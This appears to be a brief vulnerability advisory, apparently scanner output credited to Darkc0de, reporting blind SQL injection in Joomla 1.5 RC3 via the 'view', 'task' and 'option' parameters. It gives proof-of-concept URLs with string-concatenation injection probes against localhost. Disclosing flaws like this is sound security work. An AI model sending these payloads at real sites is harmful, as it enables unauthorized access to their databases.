Thanks to team of Darkc0de.com
Blind Sql-Injection in Joomla 1.5 RC3
URL : http://localhost/index.php
1. Parameter = view
The following changes were applied to the original request:
? Set parameter 'view's value to 'somechars'%20+%20'article'
POC URL : http://localhost/index.php?option=com\_content&view=somechars'%20+%20'art
icle&id=25&Itemid=28
This test uses several different HTTP requests in order to verify the existence of a Blind SQL
Injection vulnerability. The resulting test responses show that requests containing conditions with
the same logical values were identical to the original valid response, and the responses with
different values were not. This indicates that an SQL query is being executed at the back-end
database, and that the injected values affect the original query
2. Parameter = task
The following changes were applied to the original request:
? Set parameter 'task's value to 'somechars%27+%2B+%27search'
POC URL : http://localhost/index.php?searchword=&task=somechars%27+%2B+%27search&o
ption=com\_search
3. Parameter = option
The following changes were applied to the original request:
? Set parameter 'option's value to 'somechars%27+%2B+%27com\_search'
POC URL :http://localhost/index.php?searchword=&task=search&option=somechars%27+
%2B+%27com\_search
